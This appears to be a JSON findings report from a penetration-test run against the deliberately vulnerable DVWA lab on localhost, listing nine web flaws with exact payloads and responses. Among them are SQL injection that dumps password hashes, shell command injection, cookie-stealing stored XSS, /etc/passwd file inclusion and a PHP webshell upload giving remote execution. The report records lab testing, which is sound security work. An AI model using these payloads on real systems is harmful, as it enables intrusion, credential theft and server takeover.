@@ -1,0 +1,128 @@
+{
+  "run_id": "run-xrp4b-10071527",
+  "generated_at": "2026-10-07T15:33:00Z",
+  "findings": [
+    {
+      "id": "F-1",
+      "title": "SQL Injection (reflected, UNION-based) — full users credential table extraction via id parameter",
+      "severity": "critical",
+      "target": "http://127.0.0.1/vulnerabilities/sqli/?id=0' UNION SELECT user,password FROM users-- -&Submit=Submit",
+      "steps": [
+        "Authenticate to http://127.0.0.1/login.php as admin/password (capture PHPSESSID, ensure security=low cookie).",
+        "GET http://127.0.0.1/vulnerabilities/sqli/?id=1&Submit=Submit to confirm baseline row (admin/admin) renders.",
+        "Send the URL-encoded payload: id=0' UNION SELECT user,password FROM users-- - with Submit=Submit.",
+        "Read the response: the <pre> block enumerates five users — admin, gordonb, 1337, pablo, smithy — with their MD5 password hashes (admin=5f4dcc3b5aa765d61d8327deb882cf99, gordonb=e99a18c428cb38d5f260853678922e03, 1337=8d3533d75ae2c3966d7e0d4fcc69216b, pablo=0d107d09f5bbe40cade3de5c71e9e9b7, smithy=5f4dcc3b5aa765d61d8327deb882cf99)."
+      ],
+      "expected": "The application would reject or parameterize the untrusted id value, returning either a single row for id=0 or a database-layer error — no enumeration of the users table.",
+      "observed": "Five user rows are returned including MD5 password hashes; the query is clearly string-interpolated into the SQL with no sanitization (the injection prefix '0'' is echoed verbatim back in the response, proving reflection)."
+    },
+    {
+      "id": "F-2",
+      "title": "Blind SQL Injection — boolean and time-based extraction of arbitrary data via id parameter",
+      "severity": "critical",
+      "target": "http://127.0.0.1/vulnerabilities/sqli_blind/?id=1' AND ASCII(SUBSTRING((SELECT password FROM users WHERE user='admin'),1,1))=53-- -&Submit=Submit",
+      "steps": [
+        "Authenticated session with PHPSESSID cookie.",
+        "GET id=1 -> page shows 'User ID exists in the database.'; GET id=99999 -> the message is absent (boolean oracle).",
+        "GET id=1' AND '1'='1 -> exists; GET id=1' AND '1'='2 -> absent (string-concat injection confirmed).",
+        "GET id=1' AND SLEEP(3)-- - measured ~3145ms vs ~126ms baseline (time-based confirmed).",
+        "GET id=1' AND ASCII(SUBSTRING((SELECT password FROM users WHERE user='admin'),1,1))=53-- - -> 'exists' (truthy, so the first MD5 char of admin's password is '5', matching the known hash)."
+      ],
+      "expected": "The id value would be parameterized; payload syntax would not be evaluated; no timing oracles would be available.",
+      "observed": "Boolean oracle ('exists' / absent) and ~3-second time-based oracle both work, enabling per-character extraction of any value reachable via SQL."
+    },
+    {
+      "id": "F-3",
+      "title": "OS Command Injection — arbitrary command execution as www-data via ip parameter (POST)",
+      "severity": "critical",
+      "target": "http://127.0.0.1/vulnerabilities/exec/",
+      "steps": [
+        "Authenticated session with PHPSESSID cookie.",
+        "POST to /vulnerabilities/exec/ with form fields: ip=127.0.0.1; id, Submit=Submit, user_token=<hidden CSRF token from prior GET>.",
+        "Read response <pre> block: ping of 127.0.0.1 followed by 'uid=33(www-data) gid=33(www-data) groups=33(www-data)'."
+      ],
+      "expected": "The ip value would be validated as an IP-shaped string and rejected if non-conforming; shell metacharacters would be stripped or escaped.",
+      "observed": "The submitted ip value is concatenated into a shell ping(1) invocation with no escaping; the ';' separator launches a second shell command (id) that returns the web-server UID."
+    },
+    {
+      "id": "F-4",
+      "title": "Reflected Cross-Site Scripting — unencoded <script> reflection via name parameter",
+      "severity": "high",
+      "target": "http://127.0.0.1/vulnerabilities/xss_r/?name=<script>alert(1)</script>",
+      "steps": [
+        "Authenticated session.",
+        "GET /vulnerabilities/xss_r/?name=<script>alert(1)</script>.",
+        "Read response body: '<pre>Hello <script>alert(1)</script></pre>' — the payload is rendered as live HTML."
+      ],
+      "expected": "The name value would be HTML-encoded (&lt;script&gt;...) or otherwise filtered, preventing script execution in the victim's browser.",
+      "observed": "The raw <script> tag is rendered into the response and would execute JavaScript in any browser that loads this URL."
+    },
+    {
+      "id": "F-5",
+      "title": "Stored Cross-Site Scripting — persistent script injection in guestbook executes on every page load",
+      "severity": "high",
+      "target": "http://127.0.0.1/vulnerabilities/xss_s/",
+      "steps": [
+        "Authenticated session.",
+        "POST /vulnerabilities/xss_s/ with txtName=testxss, mtxMessage=<script>document.location=\"http://127.0.0.1/?cookie=\"+document.cookie</script>, btnSign=Sign Guestbook, user_token=<hidden CSRF token>.",
+        "GET /vulnerabilities/xss_s/ — read response: '<div id=\"guestbook_comments\">Name: testxss<br />Message: <script>document.location=...?cookie=+document.cookie</script><br /></div>'."
+      ],
+      "expected": "The mtxMessage value would be HTML-encoded before persistence and/or before render; stored scripts would never be served.",
+      "observed": "The raw <script> tag is stored in the database and re-rendered on every subsequent page load, with no HTML encoding — every visitor who views the guestbook executes the injected script."
+    },
+    {
+      "id": "F-6",
+      "title": "Local File Inclusion — arbitrary file read via ../ traversal in page parameter",
+      "severity": "high",
+      "target": "http://127.0.0.1/vulnerabilities/fi/?page=../../../../../etc/passwd",
+      "steps": [
+        "Authenticated session.",
+        "GET /vulnerabilities/fi/?page=../../../../../etc/passwd (depth 5 relative to the DVWA vulnerabilities/fi include point).",
+        "Read response body — 'root:x:0:0:root:/root:/bin/bash' appears as rendered text."
+      ],
+      "expected": "The page value would be restricted to an allow-list of safe filenames; '../' would have been normalized or rejected.",
+      "observed": "Any local file readable by www-data is includable. Note: PHP allow_url_include is disabled (per /setup.php), so remote URL inclusion (RFI) is blocked in this environment."
+    },
+    {
+      "id": "F-7",
+      "title": "Unrestricted File Upload — PHP webshell upload + execution under /hackable/uploads/",
+      "severity": "critical",
+      "target": "http://127.0.0.1/vulnerabilities/upload/ ; http://127.0.0.1/hackable/uploads/shell.php?c=<cmd>",
+      "steps": [
+        "Authenticated session. Fetch a fresh user_token from GET /vulnerabilities/upload/.",
+        "POST /vulnerabilities/upload/ as multipart/form-data: MAX_FILE_SIZE=100000, uploaded=@shell.php (contents '<?php system($_GET[\"c\"]); ?>'), Upload=Upload, user_token=<token>.",
+        "Read response — '<pre>../../hackable/uploads/shell.php succesfully uploaded!</pre>'.",
+        "GET http://127.0.0.1/hackable/uploads/shell.php?c=id;uname%20-a;pwd — response: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)\\nLinux 43b8266979e5 ...\\n/var/www/html/hackable/uploads'."
+      ],
+      "expected": "Upload would be restricted to non-executable MIME types and/or safe extensions (.txt/.jpg/.png); uploaded files would not be served from a web-executable location.",
+      "observed": "Any file extension is accepted; the file lands in a web-executable directory and runs as PHP on the server. Full RCE achieved."
+    },
+    {
+      "id": "F-8",
+      "title": "Cross-Site Request Forgery — admin password change via single GET, no token",
+      "severity": "medium",
+      "target": "http://127.0.0.1/vulnerabilities/csrf/?password_new=csrfpwn&password_conf=csrfpwn&Change=Change",
+      "steps": [
+        "Authenticated session.",
+        "GET /vulnerabilities/csrf/?password_new=csrfpwn&password_conf=csrfpwn&Change=Change.",
+        "Read response — '<pre>Password Changed.</pre>'.",
+        "(Test reverted password back to 'password' via the same GET pattern with password_new=password&password_conf=password.)"
+      ],
+      "expected": "Password change would require POST + a CSRF token tied to the session; the form would reject GET requests.",
+      "observed": "A single GET request from any cross-origin image tag, link, or iframe (sent while the admin holds an active session) is sufficient to silently overwrite the admin password."
+    },
+    {
+      "id": "F-9",
+      "title": "Weak Session IDs — predictable integer-counter dvwaSession cookie enables trivial hijack",
+      "severity": "medium",
+      "target": "http://127.0.0.1/vulnerabilities/weak_id/",
+      "steps": [
+        "Authenticated session.",
+        "POST to /vulnerabilities/weak_id/ five times; each response Set-Cookie: dvwaSession=<n> with n = 1, 2, 3, 4, 5 in sequence.",
+        "Capture: dvwaSession=1, dvwaSession=2, dvwaSession=3, dvwaSession=4, dvwaSession=5."
+      ],
+      "expected": "Session ID would be a high-entropy random value (PHP session_token or equivalent) — unpredictable and not enumerable.",
+      "observed": "The session cookie is a monotonically-incrementing integer. An attacker who knows or guesses the current counter can impersonate any user whose dvwaSession cookie value is known."
+    }
+  ]
+}
